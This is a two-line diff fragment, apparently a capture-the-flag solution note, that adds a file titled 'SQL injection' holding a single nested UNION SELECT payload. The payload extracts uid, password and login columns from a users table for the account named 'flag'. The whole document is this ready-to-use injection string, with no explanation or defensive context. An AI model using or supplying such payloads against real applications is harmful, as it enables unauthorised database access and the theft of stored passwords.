@@ -1,0 +1,2 @@
+SQL injection
+-1' UNION SELECT  '-1 UNION SELECT uid, password, login FROM users WHERE login=''flag'' -- '  as uid, password, login FROM users WHERE login='flag' -- qw
